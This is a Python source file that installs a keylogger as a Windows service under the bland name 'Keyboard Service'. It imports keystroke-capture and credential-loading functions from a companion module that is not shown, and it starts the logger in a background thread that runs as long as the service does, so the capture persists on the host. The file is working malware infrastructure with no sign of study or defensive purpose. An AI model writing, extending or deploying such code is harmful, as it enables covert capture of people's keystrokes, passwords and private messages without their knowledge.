# service.py
import os
import win32serviceutil
import win32service
import win32event
import servicemanager
import sys
import threading
from setup import setup_log_directory
from keylogger import start_keylogger, load_credentials
import logging

# Configure logging for the service
SERVICE_LOG_FILE = "service_debug.log"

logging.basicConfig(
    filename=SERVICE_LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
)

class KeyboardService(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyboardService"
    _svc_display_name_ = "Keyboard Service"
    _svc_description_ = "A keylogger service for monitoring keystrokes."

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        logging.info("Keyboard Service initialized.")

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        logging.info("Service stop requested.")
        win32event.SetEvent(self.stop_event)
        self.running = False

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        logging.info("Service is running.")
        self.main()

    def main(self):
        try:
            # Step 1: Run the setup to ensure the log directory is configured
            log_directory = setup_log_directory()
            logging.info(f"Log directory set to: {log_directory}")

            # Step 2: Load credentials to get the username
            credentials = load_credentials()
            username = credentials["username"]
            logging.info(f"Username loaded: {username}")

            # Step 3: Start the keylogger in a separate thread
            keylogger_thread = threading.Thread(target=start_keylogger, args=(log_directory, username))
            keylogger_thread.start()
            logging.info("Keylogger thread started.")

            # Wait for stop signal
            win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
            logging.info("Service received stop signal.")
        except Exception as e:
            logging.error(f"Exception in service main: {e}")

if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(KeyboardService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(KeyboardService)